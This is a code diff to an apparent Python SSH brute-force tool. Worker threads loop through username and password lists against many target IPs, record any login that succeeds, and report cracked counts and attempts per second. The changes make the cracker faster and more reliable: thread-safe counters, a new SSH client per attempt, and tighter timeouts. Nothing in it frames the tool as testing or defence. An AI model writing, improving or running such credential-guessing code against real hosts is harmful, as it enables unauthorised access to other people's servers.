@@ -14,16 +14,21 @@ basicConfig(level=CRITICAL)
 class Counter:
     def __init__(self, value=0):
         self._value = RawValue('i', value)
+        self._lock = Lock()
 
     def __iadd__(self, value):
-        self._value.value += value
+        with self._lock:
+            self._value.value += value
         return self
 
     def __int__(self):
-        return self._value.value
+        with self._lock:
+            data = self._value.value
+        return data
 
     def set(self, value):
-        self._value.value = value
+        with self._lock:
+            self._value.value = value
         return self
 
 
@@ -157,19 +162,16 @@ class Cracker:
             self.tps.set(0)
             sleep(.9)
             print("Current TPS", int(self.tps), end="\r")
+
         Logger.succses("Cracked: %d Tried %d" % (int(self.cracked), int(self.tried)))
 
     class Worker(Thread):
         def __init__(self, root):
             super().__init__(daemon=True)
             self.root = root
-            self.sshClient = SSHClient()
 
 
         def run(self):
-            self.sshClient.set_missing_host_key_policy(AutoAddPolicy()) 
-            self.sshClient.load_system_host_keys()
-            self.root.event.wait()
 
             with suppress(StopIteration, RuntimeError):
                 while self.root.isRunning():
@@ -177,15 +179,22 @@ class Cracker:
                 return
 
         def crack(self, target, port=22):
-            self.root.tps += 1
-            
+            self.root.event.wait()
             try:
                 for username in self.root.userlist:
                     for password in self.root.passlist:
                         try:
-                            self.sshClient.connect(target, port, username, password, timeout=1, banner_timeout=1.1)
-                            self.sshClient.close()
-                            self.root.save(target, port, username, password)
+                            sshClient = SSHClient()
+                            try:
+                                sshClient.set_missing_host_key_policy(AutoAddPolicy()) 
+                                sshClient.load_system_host_keys()
+
+                                sshClient.connect(target, port, username,
+                                                        password, timeout=1, banner_timeout=1.1,
+                                                        look_for_keys=False, auth_timeout=1.2)
+                                self.root.save(target, port, username, password)
+                            finally:
+                                sshClient.close()
                             return
 
                         except AuthenticationException:
@@ -193,9 +202,13 @@ class Cracker:
                         except Exception as e:
                             Logger.warning("[%s] %s | %d/%d" % (target, str(e) or repr(e), int(self.root.tried), len(self.root.sync_ips)))
                             return
+                                    
+                        finally:
+                            self.root.tps += 1
+                        
             finally:
                 self.root.tried += 1
-                        
+
 
 
 if __name__ == "__main__":
